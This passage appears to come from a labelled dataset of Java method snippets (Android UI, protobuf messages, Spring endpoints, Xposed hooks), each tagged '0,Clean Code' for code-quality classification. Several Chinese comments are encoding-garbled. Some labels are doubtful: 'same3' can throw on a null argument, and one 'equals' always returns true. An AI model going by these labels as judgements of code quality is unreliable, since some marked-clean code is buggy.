      BulletinFactory.showError(err);
    }
    NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.mainUserInfoChanged);
    NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.smsJobStatusUpdate);
    if (whenDone != null) {
      whenDone.run(isEligible);
    }
  }
));
}
",0,Clean Code
"@Override public boolean preHandle(HttpServletRequest request,HttpServletResponse response,Object handler) throws Exception {
  addOriginList();
  String origin=request.getHeader(""Origin"");
  boolean embedded=StringUtils.startsWithAny(request.getRequestURI(),""/assets/"",""/js/"");
  if ((StringUtils.isNotBlank(origin) && originList.contains(origin)) || busiOriginList.contains(origin) || embedded) {
    response.setHeader(""Access-Control-Allow-Origin"",embedded ? ""*"" : origin);
    response.setHeader(""Access-Control-Allow-Credentials"",""true"");
    response.setHeader(""Access-Control-Allow-Methods"",""GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS"");
    response.setHeader(""Access-Control-Allow-Headers"",""*"");
    response.setHeader(""Access-Control-Max-Age"",""3600"");
  }
  if (StringUtils.equalsIgnoreCase(request.getMethod(),""options"")) {
    response.setStatus(200);
    return false;
  }
  return true;
}",0,Clean Code
"@Override public GeneratorElementNode visitObjectElement(ObjectElementContext ctx){
  var member=doVisitObjectElement(ctx);
  insertWriteForGeneratorVarsToFrameSlotsNode(member.getMemberNode());
  return GeneratorElementNodeGen.create(member);
}
",0,Clean Code
"public long getRecallTime(){
  return this.recallTime;
}
",0,Clean Code
"private double aggregatedScore(double meanScore,double maxScore){
  return (meanToMaxScoreRatio * meanScore) + ((1 - meanToMaxScoreRatio) * maxScore);
}",0,Clean Code
"@Override public ActionBar createActionBar(Context context){
  BaseFragment lastFragment=parentLayout.getLastFragment();
  if (lastFragment instanceof ChatActivity && ((ChatActivity)lastFragment).themeDelegate != null && ((ChatActivity)lastFragment).themeDelegate.getCurrentTheme() != null) {
    resourcesProvider=lastFragment.getResourceProvider();
  }
  ActionBar actionBar=new ActionBar(context,resourcesProvider){
    @Override public boolean onTouchEvent(    MotionEvent event){
      avatarContainer.getHitRect(rect);
      if (rect.contains((int)event.getX(),(int)event.getY())) {
        return false;
      }
      return super.onTouchEvent(event);
    }
    @Override public void setItemsColor(    int color,    boolean isActionMode){
      super.setItemsColor(color,isActionMode);
      if (!isActionMode && ttlIconView != null) {
        ttlIconView.setColorFilter(new PorterDuffColorFilter(color,PorterDuff.Mode.MULTIPLY));
      }
    }
  }
;
  actionBar.setColorFilterMode(PorterDuff.Mode.SRC_IN);
  actionBar.setForceSkipTouches(true);
  actionBar.setBackgroundColor(Color.TRANSPARENT);
  actionBar.setItemsBackgroundColor(getThemedColor(Theme.key_avatar_actionBarSelectorBlue),false);
  actionBar.setItemsColor(getThemedColor(Theme.key_actionBarDefaultIcon),false);
  actionBar.setBackButtonDrawable(new BackDrawable(false));
  actionBar.setCastShadows(false);
  actionBar.setAddToContainer(false);
  actionBar.setClipContent(true);
  actionBar.setOccupyStatusBar(Build.VERSION.SDK_INT >= 21 && !AndroidUtilities.isTablet() && !inBubbleMode);
  ImageView backButton=actionBar.getBackButton();
  backButton.setOnLongClickListener(e -> {
    ActionBarPopupWindow menu=BackButtonMenu.show(this,backButton,getDialogId(),getTopicId(),resourcesProvider);
    if (menu != null) {
      menu.setOnDismissListener(() -> dimBehindView(false));
      dimBehindView(backButton,0.3f);
      if (undoView != null) {
        undoView.hide(true,1);
      }
      return true;
    }
 else {
      return false;
    }
  }
);
  return actionBar;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(starCount);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(reward);
  }
  return size;
}",0,Clean Code
"static boolean same3(Object a,Object b){
  if ((a == null && b == null) || a.equals(b))   return true;
 else   return false;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(slot);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(id);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeEnumSizeNoTag(avatarType);
  }
  return size;
}",0,Clean Code
"@Override public int numFields(){
  return numFields;
}
",0,Clean Code
"String getChannleId();
",0,Clean Code
"public static FEKit getInstance(){
  return null;
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof RogueBuffRollInfo)) {
    return false;
  }
  RogueBuffRollInfo other=(RogueBuffRollInfo)o;
  return true;
}
",0,Clean Code
"/** 
 * @return factory for creating SpBarInfo messages
 */
public static MessageFactory<SpBarInfo> getFactory(){
  return SpBarInfoFactory.INSTANCE;
}
",0,Clean Code
"public String readJavaString(MemoryBuffer buffer){
  if (STRING_VALUE_FIELD_IS_BYTES) {
    return readBytesString(buffer);
  }
 else {
    assert STRING_VALUE_FIELD_IS_CHARS;
    if (compressString) {
      return readCompressedCharsString(buffer);
    }
 else {
      return newCharsStringZeroCopy(buffer.readCharsAndSize());
    }
  }
}
",0,Clean Code
"public boolean isBeanPriorityLoadEnable(){
  return beanPriorityLoadEnable;
}
",0,Clean Code
"protected synchronized void removeUnusedLiveDanmakusIn(final int msec){
  if (danmakuList == null || danmakuList.isEmpty() || mLiveDanmakus.isEmpty())   return;
  mLiveDanmakus.forEachSync(new IDanmakus.DefaultConsumer<BaseDanmaku>(){
    long startTime=SystemClock.uptimeMillis();
    @Override public int accept(    BaseDanmaku danmaku){
      boolean isTimeout=danmaku.isTimeOut();
      if (SystemClock.uptimeMillis() - startTime > msec) {
        return ACTION_BREAK;
      }
      if (isTimeout) {
        danmakuList.removeItem(danmaku);
        onDanmakuRemoved(danmaku);
        return ACTION_REMOVE;
      }
 else {
        return ACTION_BREAK;
      }
    }
  }
);
}
",0,Clean Code
"public void backFromHere(){
  if (currentUI == uiStartGame || currentUI == null) {
    OldMainActivity.CURRENT_ACTIVITY.get().finish();
  }
  if (currentUI == uiGamedir || currentUI == uiGamelist || currentUI == uiLauncherSetting || currentUI == uiUser || currentUI == uiPlugin || currentUI == uiLog) {
    switchUIs(uiStartGame,mContext.getString(R.string.title_home));
  }
  if (currentUI == uiGameSetting || currentUI == uiInstallVersion) {
    switchUIs(uiGamelist,mContext.getString(R.string.title_game_list));
  }
}
",0,Clean Code
"@Test void should_support_EXTRACT(){
  assertThat(parser.parse(""year = EXTRACT(YEAR FROM CURRENT_DATE)"")).isEqualTo(metadataKey(""year"").isEqualTo(currentYear()));
  assertThat(parser.parse(""year = EXTRACT(YEAR FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""year"").isEqualTo(currentYear()));
  assertThat(parser.parse(""year = EXTRACT(YEAR FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""year"").isEqualTo(currentYear()));
  assertThat(parser.parse(""month = EXTRACT(MONTH FROM CURRENT_DATE)"")).isEqualTo(metadataKey(""month"").isEqualTo(currentMonth()));
  assertThat(parser.parse(""month = EXTRACT(MONTH FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""month"").isEqualTo(currentMonth()));
  assertThat(parser.parse(""month = EXTRACT(MONTH FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""month"").isEqualTo(currentMonth()));
  assertThat(parser.parse(""week = EXTRACT(WEEK FROM CURRENT_DATE)"")).isEqualTo(metadataKey(""week"").isEqualTo(currentWeek()));
  assertThat(parser.parse(""week = EXTRACT(WEEK FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""week"").isEqualTo(currentWeek()));
  assertThat(parser.parse(""week = EXTRACT(WEEK FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""week"").isEqualTo(currentWeek()));
  assertThat(parser.parse(""day = EXTRACT(DAY FROM CURRENT_DATE)"")).isEqualTo(metadataKey(""day"").isEqualTo(currentDayOfMonth()));
  assertThat(parser.parse(""day = EXTRACT(DAY FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""day"").isEqualTo(currentDayOfMonth()));
  assertThat(parser.parse(""day = EXTRACT(DAY FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""day"").isEqualTo(currentDayOfMonth()));
  assertThat(parser.parse(""dow = EXTRACT(DOW FROM CURRENT_DATE)"")).isEqualTo(metadataKey(""dow"").isEqualTo(currentDayOfWeek()));
  assertThat(parser.parse(""dow = EXTRACT(DOW FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""dow"").isEqualTo(currentDayOfWeek()));
  assertThat(parser.parse(""dow = EXTRACT(DOW FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""dow"").isEqualTo(currentDayOfWeek()));
  assertThat(parser.parse(""doy = EXTRACT(DOY FROM CURRENT_DATE)"")).isEqualTo(metadataKey(""doy"").isEqualTo(currentDayOfYear()));
  assertThat(parser.parse(""doy = EXTRACT(DOY FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""doy"").isEqualTo(currentDayOfYear()));
  assertThat(parser.parse(""doy = EXTRACT(DOY FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""doy"").isEqualTo(currentDayOfYear()));
  assertThat(parser.parse(""hour = EXTRACT(HOUR FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""hour"").isEqualTo(currentHour()));
  assertThat(parser.parse(""hour = EXTRACT(HOUR FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""hour"").isEqualTo(currentHour()));
  assertThat(parser.parse(""minute = EXTRACT(MINUTE FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""minute"").isEqualTo(currentMinute()));
  assertThat(parser.parse(""minute = EXTRACT(MINUTE FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""minute"").isEqualTo(currentMinute()));
}
",0,Clean Code
"public static void openBoostsForUsers(BaseFragment baseFragment,boolean isCurrentChat,long dialogId,ChannelBoostsController.CanApplyBoost canApplyBoost,TL_stories.TL_premium_boostsStatus boostsStatus,ChatMessageCell chatMessageCell){
  if (baseFragment == null || canApplyBoost == null || boostsStatus == null || baseFragment.getContext() == null) {
    return;
  }
  LimitReachedBottomSheet limitReachedBottomSheet=new LimitReachedBottomSheet(baseFragment,baseFragment.getContext(),TYPE_BOOSTS_FOR_USERS,baseFragment.getCurrentAccount(),baseFragment.getResourceProvider());
  limitReachedBottomSheet.setCanApplyBoost(canApplyBoost);
  limitReachedBottomSheet.setBoostsStats(boostsStatus,isCurrentChat);
  limitReachedBottomSheet.setDialogId(dialogId);
  limitReachedBottomSheet.setChatMessageCell(chatMessageCell);
  baseFragment.showDialog(limitReachedBottomSheet);
}
",0,Clean Code
"/** 
 * 淇敼绯荤当閰嶇疆
 * @param adminConfig 閰嶇疆瀹炰綋
 * @return data
 */
@PostMapping(value=""/adminConfig/updateAdminConfig"") Result updateAdminConfig(@RequestBody AdminConfig adminConfig);
",0,Clean Code
"@PostMapping(""/queryAttendanceEmpMonthDailyDetailPageList"") @ApiOperation(""鏌ヨ鎵撳崱姒傚喌鍒楄〃"") public Result<BasePage<QueryAttendanceEmpMonthDetailVO>> queryAttendanceEmpMonthDetailPageList(@RequestBody QueryAttendanceEmpMonthRecordBO queryAttendanceEmpMonthRecordBO){
  BasePage<QueryAttendanceEmpMonthDetailVO> page=attendanceClockService.queryAttendanceEmpMonthDetailPageList(queryAttendanceEmpMonthRecordBO);
  return Result.ok(page);
}
",0,Clean Code
"/** 
 * Invoked if a comment has been appended to a function node.
 * @param node The function node where the comment has been appended.
 * @param comment The comment that has been appended.
 */
void appendedFunctionNodeComment(NodeType node,CommentType comment);
",0,Clean Code
"private SerializableRange buildRange(Map<String,String> caseInsensitiveParams){
  if (numParallelSubtasks <= 0 || indexOfThisSubtask < 0) {
    return SerializableRange.ofFullRange();
  }
  if (caseInsensitiveParams == null || caseInsensitiveParams.isEmpty() || !caseInsensitiveParams.containsKey(ENABLE_KEY_HASH_RANGE_KEY)) {
    return SerializableRange.ofFullRange();
  }
  final String enableKeyHashRange=caseInsensitiveParams.get(ENABLE_KEY_HASH_RANGE_KEY);
  if (!Boolean.parseBoolean(enableKeyHashRange)) {
    return SerializableRange.ofFullRange();
  }
  final Range range=SourceSinkUtils.distributeRange(numParallelSubtasks,indexOfThisSubtask);
  return SerializableRange.of(range);
}",0,Clean Code
"/** 
 * 娣诲姞瀛楀吀鍒楄〃
 * @param dicts 瀛楀吀鍒楄〃
 * @param columns 鍒楅泦鍚�
 */
public static void addDicts(Set<String> dicts,List<GenTableColumn> columns){
  for (  GenTableColumn column : columns) {
    if (!column.isSuperColumn() && StringUtils.isNotEmpty(column.getDictType()) && StringUtils.equalsAny(column.getHtmlType(),new String[]{GenConstants.HTML_SELECT,GenConstants.HTML_RADIO,GenConstants.HTML_CHECKBOX})) {
      dicts.add(""'"" + column.getDictType() + ""'"");
    }
  }
}
",0,Clean Code
"private boolean init(final boolean isFirstStream) throws IOException {
  if (null == bin) {
    throw new IOException(""No InputStream"");
  }
  if (!isFirstStream) {
    bin.clearBitCache();
  }
  final int magic0=readNextByte(this.bin);
  if (magic0 == -1 && !isFirstStream) {
    return false;
  }
  final int magic1=readNextByte(this.bin);
  final int magic2=readNextByte(this.bin);
  if (magic0 != 'B' || magic1 != 'Z' || magic2 != 'h') {
    throw new IOException(isFirstStream ? ""Stream is not in the BZip2 format"" : ""Garbage after a valid BZip2 stream"");
  }
  final int blockSize=readNextByte(this.bin);
  if ((blockSize < '1') || (blockSize > '9')) {
    throw new IOException(""BZip2 block size is invalid"");
  }
  this.blockSize100k=blockSize - '0';
  this.computedCombinedCRC=0;
  return true;
}",0,Clean Code
"@Override public Iterator<GameAvatar> iterator(){
  return getAvatars().values().iterator();
}
",0,Clean Code
"@Override protected void after(MethodHookParam param){
  XposedHelpers.setBooleanField(param.thisObject,""mSpringBackEnable"",false);
}
@Override protected void after(MethodHookParam param){
  ((View)param.thisObject).setOverScrollMode(View.OVER_SCROLL_NEVER);
  XposedHelpers.setBooleanField(param.thisObject,""mSpringBackEnable"",false);
}
",0,Clean Code
"/** 
 * <code>optional .LineupInfo lineup = 8;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public LineupInfoOuterClass.LineupInfo getMutableLineup(){
  bitField0_|=0x00000004;
  return lineup;
}",0,Clean Code
"public ModIconCache(){
  cachePath=getImageCachePath();
  if (!cachePath.exists() && !cachePath.isFile() && Tools.DIR_CACHE.canWrite()) {
    if (!cachePath.mkdirs())     throw new RuntimeException(""Failed to create icon cache directory"");
  }
}
",0,Clean Code
"public GGProPlayNodeInfo(GProPlayNodeInfo gProPlayNodeInfo){
  this.mInfo=gProPlayNodeInfo;
}
",0,Clean Code
"public static long allocateMemory(long size){
  return UNSAFE.allocateMemory(size);
}
",0,Clean Code
"private static String generateString(Pattern pattern,String prefix,int min,int max){
  if (min <= 0 && max >= 0 && pattern.matcher(prefix).matches())   return prefix;
  if (max <= 0) {
    return DEFAULT;
  }
  List<Character> candidates=new ArrayList<>();
  generateCandidates(candidates,pattern,prefix);
  Collections.shuffle(candidates);
  return verifyAndReturn(pattern,prefix,min,max,candidates);
}",0,Clean Code
"@Override public SnapshotPendingSplitsState snapshotState(long checkpointId){
  SnapshotPendingSplitsState state=new SnapshotPendingSplitsState(alreadyProcessedTables,remainingSplits,assignedSplits,tableSchemas,splitFinishedOffsets,assignerStatus,remainingTables,isTableIdCaseSensitive,true,chunkSplitter.snapshotState(checkpointId));
  if (checkpointIdToFinish == null && AssignerStatus.isAssigningSnapshotSplits(assignerStatus) && allSnapshotSplitsFinished()) {
    checkpointIdToFinish=checkpointId;
  }
  return state;
}
",0,Clean Code
"private void callOnResume(Activity activity){
  if (activity.isDestroyed() || activity.isFinishing() || activity instanceof DialogXFloatingWindowActivity) {
    return;
  }
  if (onActivityResumeCallBack != null) {
    onActivityResumeCallBack.getActivity(activity);
  }
}
",0,Clean Code
"public Boolean isStream(){
  return this.stream;
}
",0,Clean Code
"/** 
 * 鍦ㄦ粦鍔ㄦ垨鑰呰烦杞殑杩囩▼涓紝绗竴娆″垱寤篺ragment鐨勬椂鍊欏潎浼氳皟鐢╫nResume鏂规硶
 */
@Override public void onResume(){
  super.onResume();
  if (!mIsFirstVisible) {
    if (!isHidden() && !currentVisibleState && getUserVisibleHint()) {
      dispatchUserVisibleHint(true);
    }
  }
}
",0,Clean Code
"public static final com.google.protobuf.Descriptors.Descriptor getDescriptor(){
  return OperateLogEntity.internal_static_Entity_descriptor;
}
",0,Clean Code
"@NonNull List<Integer> getSpecialType();
",0,Clean Code
"@EventHandler private void onRender(Render2DEvent event){
  if (Utils.isLoading())   return;
  if (!active || shouldHideHud())   return;
  if ((mc.options.hudHidden || mc.inGameHud.getDebugHud().shouldShowDebugHud()) && !HudEditorScreen.isOpen())   return;
  HudRenderer.INSTANCE.begin(event.drawContext);
  for (  HudElement element : elements) {
    element.updatePos();
    if (element.isActive())     element.render(HudRenderer.INSTANCE);
  }
  HudRenderer.INSTANCE.end();
}",0,Clean Code
"public void setParent(View parent){
  if (this.parent == parent)   return;
  if (this.parent != null) {
    this.parent.removeOnAttachStateChangeListener(parentAttachListener);
    if (this.parent.isAttachedToWindow() && !parent.isAttachedToWindow()) {
      imageReceiver.onDetachedFromWindow();
    }
  }
  if ((this.parent == null || !this.parent.isAttachedToWindow()) && parent != null && parent.isAttachedToWindow()) {
    imageReceiver.onAttachedToWindow();
  }
  this.parent=parent;
  imageReceiver.setParentView(parent);
  if (parent != null) {
    parent.addOnAttachStateChangeListener(parentAttachListener);
  }
}
",0,Clean Code
"/** 
 * Take a list of ItemStacks and amalgamate where possible.<br>
 * @param inputStacks a list of ItemStacks
 * @return a list of ItemStacks, where all items of the same type are grouped into one stack.
 */
public static NonNullList<ItemStack> consolidateItemStacks(NonNullList<ItemStack> inputStacks){
  NonNullList<ItemStack> outputStacks=NonNullList.create();
  for (  ItemStack sourceIS : inputStacks) {
    boolean bFound=false;
    for (    ItemStack destIS : outputStacks) {
      if (destIS != null && sourceIS != null && itemStackIngredientsMatch(destIS,sourceIS)) {
        bFound=true;
        destIS.setCount(destIS.getCount() + sourceIS.getCount());
      }
    }
    if (!bFound) {
      assert sourceIS != null;
      outputStacks.add(sourceIS.copy());
    }
  }
  return outputStacks;
}
",0,Clean Code
"private void clearRecent(){
  if ((type == TYPE_REACTIONS || type == TYPE_TAGS) && onRecentClearedListener != null) {
    onRecentClearedListener.onRecentCleared();
  }
}
",0,Clean Code
"@Override public void afterPropertiesSet() throws Exception {
  if (someConfigurationMethod()) {
    userValidator=beanFactory.getBean(""simpleUserValidator"",UserValidator.class);
  }
 else {
    userValidator=beanFactory.getBean(""complexUserValidator"",UserValidator.class);
  }
}
",0,Clean Code
"@Override public MoonBoxResult<String> saveRecord(String body){
  Assert.notNull(body,""save record body cannot be null"");
  RecordWrapper wrapper=SerializerWrapper.hessianDeserialize(body,RecordWrapper.class);
  if (wrapper == null || StringUtils.isEmpty(wrapper.getAppName()) || StringUtils.isBlank(wrapper.getTaskRunId())) {
    return MoonBoxResult.createFailResponse(""invalid request"");
  }
  AgentConfig agentConfig=taskConfigService.getTaskConfigCache(wrapper.getTaskRunId());
  Assert.notNull(agentConfig,""agent config query error!recordTaskRunId="" + wrapper.getTaskRunId());
  RecordWrapperEntity entity=new RecordWrapperEntity();
  BeanUtils.copyProperties(wrapper,entity);
  entity.setWrapperData(body);
  entity.setTemplateId(agentConfig.getRecordTemplateId());
  try {
    Object response=SerializerWrapper.hessianDeserialize(wrapper.getEntranceInvocation().getResponseSerialized(),Object.class);
    if (response instanceof String) {
      entity.setResponse((String)response);
    }
 else {
      entity.setResponse(JSON.toJSONString(response));
    }
  }
 catch (  SerializeException e) {
    log.error(""deserialize response body failed, response:{}."",wrapper.getEntranceInvocation().getResponseSerialized(),e);
  }
  Object[] objects=SerializerProvider.instance().provide(Serializer.Type.HESSIAN).deserialize(wrapper.getEntranceInvocation().getRequestSerialized(),Object[].class);
  try {
    entity.setRequest(JacksonUtils.serialize(objects));
  }
 catch (  Exception e) {
    log.error(""deserialize request body failed, body:{}."",wrapper.getEntranceInvocation().getRequestSerialized(),e);
  }
  String errMsg=recordRedisService == null ? """" : recordRedisService.judgeSave(wrapper,agentConfig.getRecordAgentConfig(),entity);
  if (StringUtils.isNotEmpty(errMsg)) {
    return MoonBoxResult.createFailResponse(errMsg);
  }
  boolean isSuccess=recordDataService.saveData(entity);
  return isSuccess ? MoonBoxResult.createSuccess(""-/-"") : MoonBoxResult.createFailResponse(""failed"");
}
",0,Clean Code
"/** 
 * Set the node below this one in the k-d tree.
 * @param node The node being added to the tree.
 */
void setBelow(DimensionNode node){
  if (node == null) {
    this.below=null;
  }
 else   if ((this.dimension + 1 == node.dimension) || (this.dimension == maxD && node.dimension == 0)) {
    this.below=node;
  }
 else {
    throw new IllegalArgumentException(""Setting the below/left node failed because the dimensions are incorrect."");
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 plane_id = 6;</code>
 * @param value the planeId to set
 * @return this
 */
public QuitLineupCsReq setPlaneId(final int value){
  bitField0_|=0x00000001;
  planeId=value;
  return this;
}",0,Clean Code
"public GGProBlockInfo(GProBlockInfo gProBlockInfo){
  this.mInfo=gProBlockInfo;
}
",0,Clean Code
"private PostgresDataType getMeaningfulType(){
  if (Randomly.getBooleanWithSmallProbability() || columns == null || columns.isEmpty()) {
    return PostgresDataType.getRandomType();
  }
 else {
    return Randomly.fromList(columns).getType();
  }
}
",0,Clean Code
"@Override public String getCriterionDescription(){
  return ""OR"";
}
",0,Clean Code
"StackFrameLoop(List<Object> frames,int count){
  this.count=count;
  this.frames=frames;
}
",0,Clean Code
"@VisibleForTesting ImmutablePair<String,Integer> getWorkflowNameAndVersion(String nameVersionStr){
  int lastIndexOfDelimiter=nameVersionStr.lastIndexOf(INDEX_DELIMITER);
  if (lastIndexOfDelimiter == -1) {
    throw new IllegalStateException(nameVersionStr + "" is not in the 'workflowName"" + INDEX_DELIMITER+ ""version' pattern."");
  }
  String workflowName=nameVersionStr.substring(0,lastIndexOfDelimiter);
  String versionStr=nameVersionStr.substring(lastIndexOfDelimiter + 1);
  try {
    return new ImmutablePair<>(workflowName,Integer.parseInt(versionStr));
  }
 catch (  NumberFormatException e) {
    throw new IllegalStateException(versionStr + "" in "" + nameVersionStr+ "" is not a valid number."");
  }
}",0,Clean Code
"public void setReplyingMessageObject(MessageObject messageObject){
  if (messageObject != null) {
    if (botMessageObject == null && botButtonsMessageObject != replyingMessageObject) {
      botMessageObject=botButtonsMessageObject;
    }
    replyingMessageObject=messageObject;
    if (!(parentFragment != null && parentFragment.isTopic && parentFragment.getThreadMessage() == replyingMessageObject)) {
      setButtons(replyingMessageObject,true);
    }
  }
 else   if (replyingMessageObject == botButtonsMessageObject) {
    replyingMessageObject=null;
    setButtons(botMessageObject,false);
    botMessageObject=null;
  }
 else {
    replyingMessageObject=null;
  }
  MediaController.getInstance().setReplyingMessage(messageObject,getThreadMessage());
  updateFieldHint(false);
}
",0,Clean Code
"public static void main(String[] args){
  int N=20;
  int M=100;
  int testTime=100000;
  System.out.println(""娴嬭瘯寮�濮�"");
  for (int i=0; i < testTime; i++) {
    int size=(int)(Math.random() * (N + 1));
    int[] arr=randomArray(size,M);
    int sum=(int)(Math.random() * ((M << 1) + 1)) - M;
    boolean ans1=isSum1(arr,sum);
    boolean ans2=isSum2(arr,sum);
    boolean ans3=isSum3(arr,sum);
    boolean ans4=isSum4(arr,sum);
    if (ans1 ^ ans2 || ans3 ^ ans4 || ans1 ^ ans3) {
      System.out.println(""鍑洪敊浜嗭紒"");
      System.out.print(""arr : "");
      for (      int num : arr) {
        System.out.print(num + "" "");
      }
      System.out.println();
      System.out.println(""sum : "" + sum);
      System.out.println(""鏂规硶涓�绛旀 : "" + ans1);
      System.out.println(""鏂规硶浜岀瓟妗� : "" + ans2);
      System.out.println(""鏂规硶涓夌瓟妗� : "" + ans3);
      System.out.println(""鏂规硶鍥涚瓟妗� : "" + ans4);
      break;
    }
  }
  System.out.println(""娴嬭瘯缁撴潫"");
}",0,Clean Code
"@Override public void onScrolled(RecyclerView recyclerView,int dx,int dy){
  if (fwdRestrictedHint != null) {
    fwdRestrictedHint.hide();
  }
  checkListViewScroll();
  if (participantsMap != null && !usersEndReached && layoutManager.findLastVisibleItemPosition() > membersEndRow - 8) {
    getChannelParticipants(false);
  }
  sharedMediaLayout.setPinnedToTop(sharedMediaLayout.getY() <= 0);
  updateBottomButtonY();
}",0,Clean Code
"/** 
 * Use  {@link Preconditions} to check for required {@link TaskDef} fields, throwing a Runtimeexception if validations fail.
 * @param taskDef The {@code TaskDef} to check.
 */
private void validate(TaskDef taskDef){
  Preconditions.checkNotNull(taskDef,""TaskDef object cannot be null"");
  Preconditions.checkNotNull(taskDef.getName(),""TaskDef name cannot be null"");
}
/** 
 * Use  {@link Preconditions} to check for required {@link WorkflowDef} fields, throwing aRuntime exception if validations fail.
 * @param def The {@code WorkflowDef} to check.
 */
private void validate(WorkflowDef def){
  Preconditions.checkNotNull(def,""WorkflowDef object cannot be null"");
  Preconditions.checkNotNull(def.getName(),""WorkflowDef name cannot be null"");
}
",0,Clean Code
"@Override public void actionPerformed(final ActionEvent e){
  m_color=CColorChooser.this.getColor();
}
",0,Clean Code
"@Override public void init(){
  findAndHookMethod(""com.miui.home.launcher.hotseats.HotSeats"",""dispatchTouchEvent"",MotionEvent.class,new MethodHook(){
    @Override protected void before(    final MethodHookParam param) throws Throwable {
      MotionEvent ev=(MotionEvent)param.args[0];
      if (ev == null)       return;
      ViewGroup hotSeat=(ViewGroup)param.thisObject;
      Context helperContext=hotSeat.getContext();
      if (helperContext == null)       return;
      if (mDetectorHorizontal == null)       mDetectorHorizontal=new GestureDetector(helperContext,new SwipeListenerHorizontal(hotSeat));
      mDetectorHorizontal.onTouchEvent(ev);
    }
  }
);
}",0,Clean Code
"/** 
 * <code>repeated .RogueRecordAvatar avatar_list = 5;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<RogueRecordAvatarOuterClass.RogueRecordAvatar> getMutableAvatarList(){
  bitField0_|=0x00000002;
  return avatarList;
}",0,Clean Code
"/** 
 * Get current data lag limit strategy
 * @param lastDataDlt      current consumption lag of data
 * @return FlowCtrlResult  current flow control policy
 */
public FlowCtrlResult getCurDataLimit(long lastDataDlt){
  Calendar rightNow=Calendar.getInstance(timeZone);
  int hour=rightNow.get(Calendar.HOUR_OF_DAY);
  int minu=rightNow.get(Calendar.MINUTE);
  int curTime=hour * 100 + minu;
  if (lastDataDlt < this.minDataLimitDlt.get() || curTime < this.dataLimitStartTime.get() || curTime > this.dataLimitEndTime.get()) {
    return null;
  }
  List<FlowCtrlItem> flowCtrlItemList=flowCtrlRuleSet.get(0);
  if (flowCtrlItemList == null || flowCtrlItemList.isEmpty()) {
    return null;
  }
  for (  FlowCtrlItem flowCtrlItem : flowCtrlItemList) {
    if (flowCtrlItem == null) {
      continue;
    }
    FlowCtrlResult flowCtrlResult=flowCtrlItem.getDataLimit(lastDataDlt,hour,minu);
    if (flowCtrlResult != null) {
      return flowCtrlResult;
    }
  }
  return null;
}",0,Clean Code
"@Override public double readDouble() throws IOException {
  return buffer.readFloat64();
}",0,Clean Code
"public static String getPluralString(String key,int plural){
  if (key == null || key.length() == 0 || getInstance().currentPluralRules == null) {
    return ""LOC_ERR:"" + key;
  }
  String param=getInstance().stringForQuantity(getInstance().currentPluralRules.quantityForNumber(plural));
  param=key + ""_"" + param;
  int resourceId=ApplicationLoader.applicationContext.getResources().getIdentifier(param,""string"",ApplicationLoader.applicationContext.getPackageName());
  return getString(param,key + ""_other"",resourceId);
}",0,Clean Code
"private static Set<String> getABIsFromApk(String apk){
  try (ZipFile apkFile=new ZipFile(apk)){
    Enumeration<? extends ZipEntry> entries=apkFile.entries();
    Set<String> supportedABIs=new HashSet<String>();
    while (entries.hasMoreElements()) {
      ZipEntry entry=entries.nextElement();
      String name=entry.getName();
      if (name.contains(""../"")) {
        continue;
      }
      if (name.startsWith(""lib/"") && !entry.isDirectory() && name.endsWith("".so"")) {
        String supportedAbi=name.substring(name.indexOf(""/"") + 1,name.lastIndexOf(""/""));
        supportedABIs.add(supportedAbi);
      }
    }
    return supportedABIs;
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  return null;
}",0,Clean Code
"@Override public void onItemClick(TvRecyclerView parent,View itemView,int position){
  if (itemView != null && currentSelected == position && !sortAdapter.getItem(position).filters.isEmpty()) {
    BaseLazyFragment baseLazyFragment=fragments.get(currentSelected);
    if ((baseLazyFragment instanceof GridFragment)) {
      ((GridFragment)baseLazyFragment).showFilter();
    }
  }
}
",0,Clean Code
"public static boolean receiveForestTaskAward(){
  return getConfig().receiveForestTaskAward;
}
",0,Clean Code
"@Override public boolean onInterceptTouchEvent(MotionEvent ev){
  if (ev.getAction() == MotionEvent.ACTION_DOWN && scrollOffsetY != 0 && ev.getY() < scrollOffsetY) {
    dismiss();
    return true;
  }
  return super.onInterceptTouchEvent(ev);
}
@Override public boolean onInterceptTouchEvent(MotionEvent event){
  if (isEditModeEnabled) {
    return super.onInterceptTouchEvent(event);
  }
  boolean result=ContentPreviewViewer.getInstance().onInterceptTouchEvent(event,gridView,0,previewDelegate,resourcesProvider);
  return super.onInterceptTouchEvent(event) || result;
}",0,Clean Code
"/** 
 * 鑾峰彇鏍囩榛樿鍊笺��
